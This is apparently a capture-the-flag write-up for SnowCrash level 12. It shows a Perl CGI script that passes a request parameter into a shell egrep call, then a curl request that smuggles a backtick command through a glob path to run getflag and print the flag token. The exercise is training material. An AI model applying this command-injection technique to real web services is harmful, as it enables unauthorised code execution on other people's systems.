level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));

We can see some regex:
	$xx =~ tr/a-z/A-Z/; --> replace lower case char by upper case char in $xx
	$xx =~ s/\s.*//;    --> remove all the spaces in the string

---------------------------------------------------------------------------------------------

So we can use the same command we used in the previous exercice, but we need to adjust it:

	1. Put it in a file, so the command inside the file won't be affected by the 'toupper' regex.
	2. Give an Uppercase name to the file so the 'toupper' regex won't do anything.

---------------------------------------------------------------------------------------------

echo "getflag | wall" > /tmp/INNOCENT_FILE

User flag12 don't have the rights to write in our home directory, so I put it in /tmp/

And we gonna put /*/INNOCENT_FILE first argument so /tmp won't be affected by the 'toupper' regex.

---------------------------------------------------------------------------------------------

level12@SnowCrash:~curl 10.12.1.131:4646?x='`/*/INNOCENT_FILE`'

Message from flag12@SnowCrash on (none) at 13:38 ...
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
EOF
..